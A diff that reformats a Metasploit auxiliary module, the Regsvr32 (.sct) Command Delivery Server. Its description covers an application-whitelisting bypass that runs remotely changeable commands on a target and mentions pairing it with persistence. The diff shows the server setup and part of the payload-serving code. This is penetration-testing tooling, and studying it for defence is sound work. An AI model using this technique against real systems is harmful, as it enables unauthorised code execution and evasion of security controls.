@@ -7,39 +7,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'Regsvr32.exe (.sct) Command Delivery Server',
-      'Description'  => %q(
-        This module uses the Regsvr32.exe Application Whitelisting Bypass technique as a way to run a command on
-        a target system. The major advantage of this technique is that you can execute a static command on the target
-        system and dynamically and remotely change the command that will actually run (by changing the value of CMD).
-        This is useful when combined with persistence methods (e.g., a recurring scheduled task) or when flexibility
-        is needed through the use of a single command (e.g., as Rubber Ducky payload).
-      ),
-      'License'      => MSF_LICENSE,
-      'Author'       =>
-        [
-          'Casey Smith',  # AppLocker bypass research and vulnerability discovery (@subTee)
+    super(
+      update_info(
+        info,
+        'Name' => 'Regsvr32.exe (.sct) Command Delivery Server',
+        'Description' => %q{
+          This module uses the Regsvr32.exe Application Whitelisting Bypass technique as a way to run a command on
+          a target system. The major advantage of this technique is that you can execute a static command on the target
+          system and dynamically and remotely change the command that will actually run (by changing the value of CMD).
+          This is useful when combined with persistence methods (e.g., a recurring scheduled task) or when flexibility
+          is needed through the use of a single command (e.g., as Rubber Ducky payload).
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Casey Smith', # AppLocker bypass research and vulnerability discovery (@subTee)
           'Trenton Ivey', # MSF Module (kn0)
           'mubix',        # Auxiliary module idea
         ],
-      'References'     =>
-        [
+        'References' => [
           ['URL', 'http://web.archive.org/web/20170419145048/http://subt0x10.blogspot.com:80/2016/04/bypass-application-whitelisting-script.html']
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
-        OptString.new('CMD',[false, 'The command to execute',''])
-      ])
+        OptString.new('CMD', [false, 'The command to execute', ''])
+      ]
+    )
   end
-
 
   def run
     exploit
   end
-
 
   def primer
     print_status("Run the following command on the target machine:")
@@ -52,11 +57,9 @@ class MetasploitModule < Msf::Auxiliary
     send_response(cli, data, 'Content-Type' => 'text/plain')
   end
 
-
   def rand_class_id
     "#{Rex::Text.rand_text_hex 8}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 12}"
   end
-
 
   def gen_sct_file(command)
     # If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).
